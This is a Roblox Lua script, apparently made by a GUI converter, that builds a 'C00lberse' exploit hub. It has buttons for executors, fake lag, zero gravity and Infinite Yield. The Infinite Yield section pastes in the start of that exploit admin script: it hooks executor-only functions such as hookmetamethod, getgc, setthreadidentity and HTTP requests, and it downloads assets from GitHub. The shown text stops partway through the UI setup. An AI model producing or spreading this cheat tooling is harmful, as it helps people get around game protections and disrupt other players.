--[=[
 d888b  db    db d888888b      .d888b.      db      db    db  .d8b.  
88' Y8b 88    88   `88'        VP  `8D      88      88    88 d8' `8b 
88      88    88    88            odD'      88      88    88 88ooo88 
88  ooo 88    88    88          .88'        88      88    88 88~~~88 
88. ~8~ 88b  d88   .88.        j88.         88booo. 88b  d88 88   88    @uniquadev
 Y888P  ~Y8888P' Y888888P      888888D      Y88888P ~Y8888P' YP   YP  CONVERTER 
]=]

-- Instances: 44 | Scripts: 23 | Modules: 0 | Tags: 0
local G2L = {};

-- StarterGui.ScreenGui
G2L["1"] = Instance.new("ScreenGui", game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"));
G2L["1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;


-- StarterGui.ScreenGui.Frame3
G2L["2"] = Instance.new("Frame", G2L["1"]);
G2L["2"]["Visible"] = false;
G2L["2"]["BorderSizePixel"] = 3;
G2L["2"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2"]["Size"] = UDim2.new(0, 825, 0, 403);
G2L["2"]["Position"] = UDim2.new(0.17835, 0, 0.20455, 0);
G2L["2"]["BorderColor3"] = Color3.fromRGB(145, 54, 255);
G2L["2"]["Name"] = [[Frame3]];
G2L["2"]["BackgroundTransparency"] = 0.05;


-- StarterGui.ScreenGui.Frame3.DraggableFrame
G2L["3"] = Instance.new("LocalScript", G2L["2"]);
G2L["3"]["Name"] = [[DraggableFrame]];


-- StarterGui.ScreenGui.Frame3.TextLabel
G2L["4"] = Instance.new("TextLabel", G2L["2"]);
G2L["4"]["TextWrapped"] = true;
G2L["4"]["BorderSizePixel"] = 0;
G2L["4"]["TextSize"] = 14;
G2L["4"]["TextScaled"] = true;
G2L["4"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["4"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["4"]["TextColor3"] = Color3.fromRGB(126, 33, 255);
G2L["4"]["BackgroundTransparency"] = 1;
G2L["4"]["Size"] = UDim2.new(0, 825, 0, 50);
G2L["4"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["4"]["Text"] = [[C00lberse x luisgameriscool gui]];


-- StarterGui.ScreenGui.Frame3.TextButton
G2L["5"] = Instance.new("TextButton", G2L["2"]);
G2L["5"]["BorderSizePixel"] = 0;
G2L["5"]["TextSize"] = 14;
G2L["5"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["5"]["BackgroundColor3"] = Color3.fromRGB(162, 48, 255);
G2L["5"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["5"]["Size"] = UDim2.new(0, 200, 0, 50);
G2L["5"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["5"]["Text"] = [[BACK]];
G2L["5"]["Position"] = UDim2.new(0.75758, 0, 0.87593, 0);


-- StarterGui.ScreenGui.Frame3.TextButton.LocalScript
G2L["6"] = Instance.new("LocalScript", G2L["5"]);



-- StarterGui.ScreenGui.Frame3.TextButton
G2L["7"] = Instance.new("TextButton", G2L["2"]);
G2L["7"]["TextWrapped"] = true;
G2L["7"]["BorderSizePixel"] = 2;
G2L["7"]["TextSize"] = 14;
G2L["7"]["TextScaled"] = true;
G2L["7"]["TextColor3"] = Color3.fromRGB(133, 85, 255);
G2L["7"]["BackgroundColor3"] = Color3.fromRGB(31, 181, 8);
G2L["7"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["7"]["Size"] = UDim2.new(0, 38, 0, 39);
G2L["7"]["BorderColor3"] = Color3.fromRGB(145, 54, 255);
G2L["7"]["Text"] = [[X]];
G2L["7"]["Position"] = UDim2.new(0.95394, 0, 0, 0);


-- StarterGui.ScreenGui.Frame3.TextButton.LocalScript
G2L["8"] = Instance.new("LocalScript", G2L["7"]);



-- StarterGui.ScreenGui.Frame3.TextButton
G2L["9"] = Instance.new("TextButton", G2L["2"]);
G2L["9"]["TextWrapped"] = true;
G2L["9"]["BorderSizePixel"] = 2;
G2L["9"]["TextSize"] = 14;
G2L["9"]["TextScaled"] = true;
G2L["9"]["TextColor3"] = Color3.fromRGB(133, 85, 255);
G2L["9"]["BackgroundColor3"] = Color3.fromRGB(31, 181, 8);
G2L["9"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["9"]["Size"] = UDim2.new(0, 200, 0, 50);
G2L["9"]["BorderColor3"] = Color3.fromRGB(145, 54, 255);
G2L["9"]["Text"] = [[inf yield]];
G2L["9"]["Position"] = UDim2.new(0.05212, 0, 0.19107, 0);


-- StarterGui.ScreenGui.Frame3.TextButton.LocalScript
G2L["a"] = Instance.new("LocalScript", G2L["9"]);



-- StarterGui.ScreenGui.Frame3.TextButton
G2L["b"] = Instance.new("TextButton", G2L["2"]);
G2L["b"]["TextWrapped"] = true;
G2L["b"]["BorderSizePixel"] = 2;
G2L["b"]["TextSize"] = 14;
G2L["b"]["TextScaled"] = true;
G2L["b"]["TextColor3"] = Color3.fromRGB(133, 85, 255);
G2L["b"]["BackgroundColor3"] = Color3.fromRGB(31, 181, 8);
G2L["b"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["b"]["Size"] = UDim2.new(0, 200, 0, 50);
G2L["b"]["BorderColor3"] = Color3.fromRGB(145, 54, 255);
G2L["b"]["Text"] = [[c00lclan]];
G2L["b"]["Position"] = UDim2.new(0.37818, 0, 0.19107, 0);


-- StarterGui.ScreenGui.Frame3.TextButton.LocalScript
G2L["c"] = Instance.new("LocalScript", G2L["b"]);



-- StarterGui.ScreenGui.Frame2
G2L["d"] = Instance.new("Frame", G2L["1"]);
G2L["d"]["Visible"] = false;
G2L["d"]["BorderSizePixel"] = 0;
G2L["d"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["d"]["Size"] = UDim2.new(0, 321, 0, 259);
G2L["d"]["Position"] = UDim2.new(0.56465, 0, 0.28624, 0);
G2L["d"]["BorderColor3"] = Color3.fromRGB(145, 54, 255);
G2L["d"]["Name"] = [[Frame2]];
G2L["d"]["BackgroundTransparency"] = 0.05;


-- StarterGui.ScreenGui.Frame2.TextButton
G2L["e"] = Instance.new("TextButton", G2L["d"]);
G2L["e"]["TextWrapped"] = true;
G2L["e"]["BorderSizePixel"] = 2;
G2L["e"]["TextSize"] = 14;
G2L["e"]["TextScaled"] = true;
G2L["e"]["TextColor3"] = Color3.fromRGB(133, 85, 255);
G2L["e"]["BackgroundColor3"] = Color3.fromRGB(31, 181, 8);
G2L["e"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["e"]["Size"] = UDim2.new(0, 38, 0, 39);
G2L["e"]["BorderColor3"] = Color3.fromRGB(145, 54, 255);
G2L["e"]["Text"] = [[X]];
G2L["e"]["Position"] = UDim2.new(0.87917, 0, 0, 0);


-- StarterGui.ScreenGui.Frame2.TextButton.LocalScript
G2L["f"] = Instance.new("LocalScript", G2L["e"]);



-- StarterGui.ScreenGui.Frame2.DraggableFrame
G2L["10"] = Instance.new("LocalScript", G2L["d"]);
G2L["10"]["Name"] = [[DraggableFrame]];


-- StarterGui.ScreenGui.Frame2.TextLabel
G2L["11"] = Instance.new("TextLabel", G2L["d"]);
G2L["11"]["TextWrapped"] = true;
G2L["11"]["BorderSizePixel"] = 0;
G2L["11"]["TextSize"] = 14;
G2L["11"]["TextScaled"] = true;
G2L["11"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["11"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["11"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["11"]["BackgroundTransparency"] = 1;
G2L["11"]["RichText"] = true;
G2L["11"]["Size"] = UDim2.new(0, 281, 0, 179);
G2L["11"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["11"]["Text"] = [[Btw noober if u somehow see this and if anyone sees this i worked at the gui to and its secret so shhhhhhhhhhhhh and its me Lucas_cubing10 ( znc_13 )]];
G2L["11"]["Position"] = UDim2.new(0.06231, 0, 0.20077, 0);


-- StarterGui.ScreenGui.Frame1
G2L["12"] = Instance.new("Frame", G2L["1"]);
G2L["12"]["BorderSizePixel"] = 3;
G2L["12"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["12"]["Size"] = UDim2.new(0, 825, 0, 403);
G2L["12"]["Position"] = UDim2.new(0.17835, 0, 0.20455, 0);
G2L["12"]["BorderColor3"] = Color3.fromRGB(145, 54, 255);
G2L["12"]["Name"] = [[Frame1]];
G2L["12"]["BackgroundTransparency"] = 0.05;


-- StarterGui.ScreenGui.Frame1.DraggableFrame
G2L["13"] = Instance.new("LocalScript", G2L["12"]);
G2L["13"]["Name"] = [[DraggableFrame]];


-- StarterGui.ScreenGui.Frame1.TextButton
G2L["14"] = Instance.new("TextButton", G2L["12"]);
G2L["14"]["TextWrapped"] = true;
G2L["14"]["BorderSizePixel"] = 2;
G2L["14"]["TextSize"] = 14;
G2L["14"]["TextScaled"] = true;
G2L["14"]["TextColor3"] = Color3.fromRGB(133, 85, 255);
G2L["14"]["BackgroundColor3"] = Color3.fromRGB(31, 181, 8);
G2L["14"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["14"]["Size"] = UDim2.new(0, 200, 0, 50);
G2L["14"]["BorderColor3"] = Color3.fromRGB(145, 54, 255);
G2L["14"]["Text"] = [[c00l executer]];
G2L["14"]["Position"] = UDim2.new(0.05939, 0, 0.14888, 0);


-- StarterGui.ScreenGui.Frame1.TextButton.LocalScript
G2L["15"] = Instance.new("LocalScript", G2L["14"]);



-- StarterGui.ScreenGui.Frame1.TextButton.LocalScript
G2L["16"] = Instance.new("LocalScript", G2L["14"]);



-- StarterGui.ScreenGui.Frame1.TextButton
G2L["17"] = Instance.new("TextButton", G2L["12"]);
G2L["17"]["TextWrapped"] = true;
G2L["17"]["BorderSizePixel"] = 2;
G2L["17"]["TextSize"] = 14;
G2L["17"]["TextScaled"] = true;
G2L["17"]["TextColor3"] = Color3.fromRGB(133, 85, 255);
G2L["17"]["BackgroundColor3"] = Color3.fromRGB(31, 181, 8);
G2L["17"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["17"]["Size"] = UDim2.new(0, 200, 0, 50);
G2L["17"]["BorderColor3"] = Color3.fromRGB(145, 54, 255);
G2L["17"]["Text"] = [[randum executer]];
G2L["17"]["Position"] = UDim2.new(0.37091, 0, 0.14888, 0);


-- StarterGui.ScreenGui.Frame1.TextButton.LocalScript
G2L["18"] = Instance.new("LocalScript", G2L["17"]);



-- StarterGui.ScreenGui.Frame1.TextButton.LocalScript
G2L["19"] = Instance.new("LocalScript", G2L["17"]);



-- StarterGui.ScreenGui.Frame1.TextButton
G2L["1a"] = Instance.new("TextButton", G2L["12"]);
G2L["1a"]["TextWrapped"] = true;
G2L["1a"]["BorderSizePixel"] = 2;
G2L["1a"]["TextSize"] = 14;
G2L["1a"]["TextScaled"] = true;
G2L["1a"]["TextColor3"] = Color3.fromRGB(133, 85, 255);
G2L["1a"]["BackgroundColor3"] = Color3.fromRGB(31, 181, 8);
G2L["1a"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1a"]["Size"] = UDim2.new(0, 200, 0, 50);
G2L["1a"]["BorderColor3"] = Color3.fromRGB(145, 54, 255);
G2L["1a"]["Text"] = [[1x1x1x1 gui]];
G2L["1a"]["Position"] = UDim2.new(0.69818, 0, 0.14888, 0);


-- StarterGui.ScreenGui.Frame1.TextButton.LocalScript
G2L["1b"] = Instance.new("LocalScript", G2L["1a"]);



-- StarterGui.ScreenGui.Frame1.TextButton.LocalScript
G2L["1c"] = Instance.new("LocalScript", G2L["1a"]);



-- StarterGui.ScreenGui.Frame1.TextLabel
G2L["1d"] = Instance.new("TextLabel", G2L["12"]);
G2L["1d"]["TextWrapped"] = true;
G2L["1d"]["BorderSizePixel"] = 0;
G2L["1d"]["TextSize"] = 14;
G2L["1d"]["TextScaled"] = true;
G2L["1d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1d"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1d"]["TextColor3"] = Color3.fromRGB(126, 33, 255);
G2L["1d"]["BackgroundTransparency"] = 1;
G2L["1d"]["Size"] = UDim2.new(0, 825, 0, 50);
G2L["1d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1d"]["Text"] = [[C00lberse x luisgameriscool gui]];


-- StarterGui.ScreenGui.Frame1.TextButton
G2L["1e"] = Instance.new("TextButton", G2L["12"]);
G2L["1e"]["TextWrapped"] = true;
G2L["1e"]["BorderSizePixel"] = 2;
G2L["1e"]["TextSize"] = 14;
G2L["1e"]["TextScaled"] = true;
G2L["1e"]["TextColor3"] = Color3.fromRGB(133, 85, 255);
G2L["1e"]["BackgroundColor3"] = Color3.fromRGB(31, 181, 8);
G2L["1e"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1e"]["Size"] = UDim2.new(0, 200, 0, 50);
G2L["1e"]["BorderColor3"] = Color3.fromRGB(145, 54, 255);
G2L["1e"]["Text"] = [[feke lag]];
G2L["1e"]["Position"] = UDim2.new(0.05939, 0, 0.41439, 0);


-- StarterGui.ScreenGui.Frame1.TextButton.LocalScript
G2L["1f"] = Instance.new("LocalScript", G2L["1e"]);



-- StarterGui.ScreenGui.Frame1.TextButton.LocalScript
G2L["20"] = Instance.new("LocalScript", G2L["1e"]);



-- StarterGui.ScreenGui.Frame1.TextButton
G2L["21"] = Instance.new("TextButton", G2L["12"]);
G2L["21"]["TextWrapped"] = true;
G2L["21"]["BorderSizePixel"] = 2;
G2L["21"]["TextSize"] = 14;
G2L["21"]["TextScaled"] = true;
G2L["21"]["TextColor3"] = Color3.fromRGB(133, 85, 255);
G2L["21"]["BackgroundColor3"] = Color3.fromRGB(31, 181, 8);
G2L["21"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["21"]["Size"] = UDim2.new(0, 38, 0, 39);
G2L["21"]["BorderColor3"] = Color3.fromRGB(145, 54, 255);
G2L["21"]["Text"] = [[X]];
G2L["21"]["Position"] = UDim2.new(0.95394, 0, 0, 0);


-- StarterGui.ScreenGui.Frame1.TextButton.LocalScript
G2L["22"] = Instance.new("LocalScript", G2L["21"]);



-- StarterGui.ScreenGui.Frame1.TextButton
G2L["23"] = Instance.new("TextButton", G2L["12"]);
G2L["23"]["TextWrapped"] = true;
G2L["23"]["BorderSizePixel"] = 2;
G2L["23"]["TextSize"] = 14;
G2L["23"]["TextScaled"] = true;
G2L["23"]["TextColor3"] = Color3.fromRGB(133, 85, 255);
G2L["23"]["BackgroundColor3"] = Color3.fromRGB(31, 181, 8);
G2L["23"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["23"]["Size"] = UDim2.new(0, 200, 0, 50);
G2L["23"]["BorderColor3"] = Color3.fromRGB(145, 54, 255);
G2L["23"]["Text"] = [[zero grevety ;)]];
G2L["23"]["Position"] = UDim2.new(0.39879, 0, 0.41439, 0);


-- StarterGui.ScreenGui.Frame1.TextButton.LocalScript
G2L["24"] = Instance.new("LocalScript", G2L["23"]);



-- StarterGui.ScreenGui.Frame1.TextButton.LocalScript
G2L["25"] = Instance.new("LocalScript", G2L["23"]);



-- StarterGui.ScreenGui.Frame1.TextButton
G2L["26"] = Instance.new("TextButton", G2L["12"]);
G2L["26"]["TextWrapped"] = true;
G2L["26"]["BorderSizePixel"] = 2;
G2L["26"]["TextSize"] = 14;
G2L["26"]["TextScaled"] = true;
G2L["26"]["TextColor3"] = Color3.fromRGB(133, 85, 255);
G2L["26"]["BackgroundColor3"] = Color3.fromRGB(31, 181, 8);
G2L["26"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["26"]["Size"] = UDim2.new(0, 200, 0, 50);
G2L["26"]["BorderColor3"] = Color3.fromRGB(145, 54, 255);
G2L["26"]["Text"] = [[quirky cmd]];
G2L["26"]["Position"] = UDim2.new(0.69818, 0, 0.41439, 0);


-- StarterGui.ScreenGui.Frame1.TextButton.LocalScript
G2L["27"] = Instance.new("LocalScript", G2L["26"]);



-- StarterGui.ScreenGui.Frame1.TextButton.LocalScript
G2L["28"] = Instance.new("LocalScript", G2L["26"]);



-- StarterGui.ScreenGui.Frame1.TextButton
G2L["29"] = Instance.new("TextButton", G2L["12"]);
G2L["29"]["BorderSizePixel"] = 0;
G2L["29"]["TextSize"] = 14;
G2L["29"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["29"]["BackgroundColor3"] = Color3.fromRGB(162, 48, 255);
G2L["29"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["29"]["Size"] = UDim2.new(0, 200, 0, 50);
G2L["29"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["29"]["Text"] = [[NEXT]];
G2L["29"]["Position"] = UDim2.new(0.75758, 0, 0.87593, 0);


-- StarterGui.ScreenGui.Frame1.TextButton.LocalScript
G2L["2a"] = Instance.new("LocalScript", G2L["29"]);



-- StarterGui.ScreenGui.Frame1.TextButton
G2L["2b"] = Instance.new("TextButton", G2L["12"]);
G2L["2b"]["BorderSizePixel"] = 0;
G2L["2b"]["TextSize"] = 14;
G2L["2b"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2b"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2b"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["2b"]["Size"] = UDim2.new(0, 25, 0, 24);
G2L["2b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2b"]["Text"] = [[]];
G2L["2b"]["Position"] = UDim2.new(0, 0, 0.94045, 0);


-- StarterGui.ScreenGui.Frame1.TextButton.LocalScript
G2L["2c"] = Instance.new("LocalScript", G2L["2b"]);



-- StarterGui.ScreenGui.Frame3.DraggableFrame
local function C_3()
local script = G2L["3"];
	local frame = script.Parent
	local UserInputService = game:GetService("UserInputService")
	
	local dragging = false
	local dragInput
	local dragStart
	local startPos
	
	local function update(input)
	    local delta = input.Position - dragStart
	    frame.Position = UDim2.new(
	        startPos.X.Scale,
	        startPos.X.Offset + delta.X,
	        startPos.Y.Scale,
	        startPos.Y.Offset + delta.Y
	    )
	end
	
	frame.InputBegan:Connect(function(input)
	    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
	        dragging = true
	        dragStart = input.Position
	        startPos = frame.Position
	        input.Changed:Connect(function()
	            if input.UserInputState == Enum.UserInputState.End then
	                dragging = false
	            end
	        end)
	    end
	end)
	
	frame.InputChanged:Connect(function(input)
	    if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
	        dragInput = input
	    end
	end)
	
	UserInputService.InputChanged:Connect(function(input)
	    if dragging and input == dragInput then
	        update(input)
	    end
	end)
	
	
end;
task.spawn(C_3);
-- StarterGui.ScreenGui.Frame3.TextButton.LocalScript
local function C_6()
local script = G2L["6"];
	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Parent.Parent.Frame1.Visible = true
		script.Parent.Parent.Parent.Frame3.Visible = false
		script.Parent.Parent.Parent.Frame.Position = script.Parent.Parent.Parent.Frame2.Position
	end)
end;
task.spawn(C_6);
-- StarterGui.ScreenGui.Frame3.TextButton.LocalScript
local function C_8()
local script = G2L["8"];
	local ogtext = script.Parent.Text
	
	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Parent.Parent.Frame3:Destroy()
	end)
end;
task.spawn(C_8);
-- StarterGui.ScreenGui.Frame3.TextButton.LocalScript
local function C_a()
local script = G2L["a"];
	script.Parent.MouseButton1Click:Connect(function()
		if IY_LOADED and not _G.IY_DEBUG == true then
			-- error("Infinite Yield is already running!", 0)
			return
		end
	
		pcall(function() getgenv().IY_LOADED = true end)
		if not game:IsLoaded() then game.Loaded:Wait() end
	
		function missing(t, f, fallback)
			if type(f) == t then return f end
			return fallback
		end
	
		cloneref = missing("function", cloneref, function(...) return ... end)
		sethidden =  missing("function", sethiddenproperty or set_hidden_property or set_hidden_prop)
		gethidden =  missing("function", gethiddenproperty or get_hidden_property or get_hidden_prop)
		queueteleport =  missing("function", queue_on_teleport or (syn and syn.queue_on_teleport) or (fluxus and fluxus.queue_on_teleport))
		httprequest =  missing("function", request or http_request or (syn and syn.request) or (http and http.request) or (fluxus and fluxus.request))
		everyClipboard = missing("function", setclipboard or toclipboard or set_clipboard or (Clipboard and Clipboard.set))
		firetouchinterest = missing("function", firetouchinterest)
		waxwritefile, waxreadfile = writefile, readfile
		writefile = missing("function", waxwritefile) and function(file, data, safe)
			if safe == true then return pcall(waxwritefile, file, data) end
			waxwritefile(file, data)
		end
		readfile = missing("function", waxreadfile) and function(file, safe)
			if safe == true then return pcall(waxreadfile, file) end
			return waxreadfile(file)
		end
		isfile = missing("function", isfile, readfile and function(file)
			local success, result = pcall(function()
				return readfile(file)
			end)
			return success and result ~= nil and result ~= ""
		end)
		makefolder = missing("function", makefolder)
		isfolder = missing("function", isfolder)
		waxgetcustomasset = missing("function", getcustomasset or getsynasset)
		hookfunction = missing("function", hookfunction)
		hookmetamethod = missing("function", hookmetamethod)
		getnamecallmethod = missing("function", getnamecallmethod or get_namecall_method)
		checkcaller = missing("function", checkcaller, function() return false end)
		newcclosure = missing("function", newcclosure)
		getgc = missing("function", getgc or get_gc_objects)
		setthreadidentity = missing("function", setthreadidentity or (syn and syn.set_thread_identity) or syn_context_set or setthreadcontext)
		replicatesignal = missing("function", replicatesignal)
	
		COREGUI = cloneref(game:GetService("CoreGui"))
		Players = cloneref(game:GetService("Players"))
		UserInputService = cloneref(game:GetService("UserInputService"))
		TweenService = cloneref(game:GetService("TweenService"))
		HttpService = cloneref(game:GetService("HttpService"))
		MarketplaceService = cloneref(game:GetService("MarketplaceService"))
		RunService = cloneref(game:GetService("RunService"))
		TeleportService = cloneref(game:GetService("TeleportService"))
		StarterGui = cloneref(game:GetService("StarterGui"))
		GuiService = cloneref(game:GetService("GuiService"))
		Lighting = cloneref(game:GetService("Lighting"))
		ContextActionService = cloneref(game:GetService("ContextActionService"))
		ReplicatedStorage = cloneref(game:GetService("ReplicatedStorage"))
		GroupService = cloneref(game:GetService("GroupService"))
		PathService = cloneref(game:GetService("PathfindingService"))
		SoundService = cloneref(game:GetService("SoundService"))
		Teams = cloneref(game:GetService("Teams"))
		StarterPlayer = cloneref(game:GetService("StarterPlayer"))
		InsertService = cloneref(game:GetService("InsertService"))
		ChatService = cloneref(game:GetService("Chat"))
		ProximityPromptService = cloneref(game:GetService("ProximityPromptService"))
		ContentProvider = cloneref(game:GetService("ContentProvider"))
		StatsService = cloneref(game:GetService("Stats"))
		MaterialService = cloneref(game:GetService("MaterialService"))
		AvatarEditorService = cloneref(game:GetService("AvatarEditorService"))
		TextService = cloneref(game:GetService("TextService"))
		TextChatService = cloneref(game:GetService("TextChatService"))
		CaptureService = cloneref(game:GetService("CaptureService"))
		VoiceChatService = cloneref(game:GetService("VoiceChatService"))
	
		IYMouse = cloneref(Players.LocalPlayer:GetMouse())
		PlayerGui = cloneref(Players.LocalPlayer:FindFirstChildWhichIsA("PlayerGui"))
		PlaceId, JobId = game.PlaceId, game.JobId
		IsOnMobile = table.find({Enum.Platform.Android, Enum.Platform.IOS}, UserInputService:GetPlatform())
		isLegacyChat = TextChatService.ChatVersion == Enum.ChatVersion.LegacyChatService
	
		-- xylex & europa
		local iyassets = {
			["infiniteyield/assets/bindsandplugins.png"] = "rbxassetid://5147695474",
			["infiniteyield/assets/close.png"] = "rbxassetid://5054663650",
			["infiniteyield/assets/editaliases.png"] = "rbxassetid://5147488658",
			["infiniteyield/assets/editkeybinds.png"] = "rbxassetid://129697930",
			["infiniteyield/assets/edittheme.png"] = "rbxassetid://4911962991",
			["infiniteyield/assets/editwaypoints.png"] = "rbxassetid://5147488592",
			["infiniteyield/assets/imgstudiopluginlogo.png"] = "rbxassetid://4113050383",
			["infiniteyield/assets/logo.png"] = "rbxassetid://1352543873",
			["infiniteyield/assets/minimize.png"] = "rbxassetid://2406617031",
			["infiniteyield/assets/pin.png"] = "rbxassetid://6234691350",
			["infiniteyield/assets/reference.png"] = "rbxassetid://3523243755",
			["infiniteyield/assets/settings.png"] = "rbxassetid://1204397029"
		}
	
		local function getcustomasset(asset)
			if waxgetcustomasset then
				local success, result = pcall(function()
					return waxgetcustomasset(asset)
				end)
				if success and result ~= nil and result ~= "" then
					return result
				end
			end
			return iyassets[asset]
		end
	
		if makefolder and isfolder and writefile and isfile then
			pcall(function() -- good executor trust
				local assets = "https://raw.githubusercontent.com/infyiff/backup/refs/heads/main/"
				for _, folder in {"infiniteyield", "infiniteyield/assets"} do
					if not isfolder(folder) then
						makefolder(folder)
					end
				end
				for path in iyassets do
					if not isfile(path) then
						writefile(path, game:HttpGet((path:gsub("infiniteyield/", assets))))
					end
				end
				if IsOnMobile then writefile("infiniteyield/assets/.nomedia") end
			end)
		end
	
		currentVersion = "6.3.4"
	
		ScaledHolder = Instance.new("Frame")
		Scale = Instance.new("UIScale")
		Holder = Instance.new("Frame")
		Title = Instance.new("TextLabel")
		Dark = Instance.new("Frame")
		Cmdbar = Instance.new("TextBox")
		CMDsF = Instance.new("ScrollingFrame")
		cmdListLayout = Instance.new("UIListLayout")
		SettingsButton = Instance.new("ImageButton")
		ColorsButton = Instance.new("ImageButton")
		Settings = Instance.new("Frame")
		Prefix = Instance.new("TextLabel")
		PrefixBox = Instance.new("TextBox")
		Keybinds = Instance.new("TextLabel")
		StayOpen = Instance.new("TextLabel")
		Button = Instance.new("Frame")
		On = Instance.new("TextButton")
		Positions = Instance.new("TextLabel")
		EventBind = Instance.new("TextLabel")
		Plugins = Instance.new("TextLabel")
		Example = Instance.new("TextButton")
		Notification = Instance.new("Frame")
		Title_2 = Instance.new("TextLabel")
		Text_2 = Instance.new("TextLabel")
		CloseButton = Instance.new("TextButton")
		CloseImage = Instance.new("ImageLabel")
		PinButton = Instance.new("TextButton")
		PinImage = Instance.new("ImageLabel")
		Tooltip = Instance.new("Frame")
		Title_3 = Instance.new("TextLabel")
		Description = Instance.new("TextLabel")
		IntroBackground = Instance.new("Frame")
		Logo = Instance.new("ImageLabel")
		Credits = Instance.new("TextBox")
		KeybindsFrame = Instance.new("Frame")
		Close = Instance.new("TextButton")
		Add = Instance.new("TextButton")
		Delete = Instance.new("TextButton")
		Holder_2 = Instance.new("ScrollingFrame")
		Example_2 = Instance.new("Frame")
		Text_3 = Instance.new("TextLabel")
		Delete_2 = Instance.new("TextButton")
		KeybindEditor = Instance.new("Frame")
		background_2 = Instance.new("Frame")
		Dark_3 = Instance.new("Frame")
		Directions = Instance.new("TextLabel")
		BindTo = Instance.new("TextButton")
		TriggerLabel = Instance.new("TextLabel")
		BindTriggerSelect = Instance.new("TextButton")
		Add_2 = Instance.new("TextButton")
		Toggles = Instance.new("ScrollingFrame")
		ClickTP  = Instance.new("TextLabel")
		Select = Instance.new("TextButton")
		ClickDelete = Instance.new("TextLabel")
		Select_2 = Instance.new("TextButton")
		Cmdbar_2 = Instance.new("TextBox")
		Cmdbar_3 = Instance.new("TextBox")
		CreateToggle = Instance.new("TextLabel")
		Button_2 = Instance.new("Frame")
		On_2 = Instance.new("TextButton")
		shadow_2 = Instance.new("Frame")
		PopupText_2 = Instance.new("TextLabel")
		Exit_2 = Instance.new("TextButton")
		ExitImage_2 = Instance.new("ImageLabel")
		PositionsFrame = Instance.new("Frame")
		Close_3 = Instance.new("TextButton")
		Delete_5 = Instance.new("TextButton")
		Part = Instance.new("TextButton")
		Holder_4 = Instance.new("ScrollingFrame")
		Example_4 = Instance.new("Frame")
		Text_5 = Instance.new("TextLabel")
		Delete_6 = Instance.new("TextButton")
		TP = Instance.new("TextButton")
		AliasesFrame = Instance.new("Frame")
		Close_2 = Instance.new("TextButton")
		Delete_3 = Instance.new("TextButton")
		Holder_3 = Instance.new("ScrollingFrame")
		Example_3 = Instance.new("Frame")
		Text_4 = Instance.new("TextLabel")
		Delete_4 = Instance.new("TextButton")
		Aliases = Instance.new("TextLabel")
		PluginsFrame = Instance.new("Frame")
		Close_4 = Instance.new("TextButton")
		Add_3 = Instance.new("TextButton")
		Holder_5 = Instance.new("ScrollingFrame")
		Example_5 = Instance.new("Frame")
		Text_6 = Instance.new("TextLabel")
		Delete_7 = Instance.new("TextButton")
		PluginEditor = Instance.new("Frame")
		background_3 = Instance.new("Frame")
